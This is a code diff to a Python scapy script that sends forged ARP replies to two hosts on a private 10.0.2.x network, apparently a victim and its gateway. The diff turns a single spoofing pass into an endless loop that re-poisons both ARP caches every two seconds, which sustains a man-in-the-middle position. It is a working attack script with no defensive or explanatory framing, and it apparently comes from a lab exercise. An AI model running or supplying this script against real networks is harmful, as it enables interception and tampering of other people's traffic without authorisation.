@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+import time
 
 import scapy.all as scapy
 
@@ -16,5 +17,7 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
-spoof("10.0.2.7", "10.0.2.1")
-spoof("10.0.2.1", "10.0.2.7")
+while True:
+    spoof("10.0.2.7", "10.0.2.1")
+    spoof("10.0.2.1", "10.0.2.7")
+    time.sleep(2)
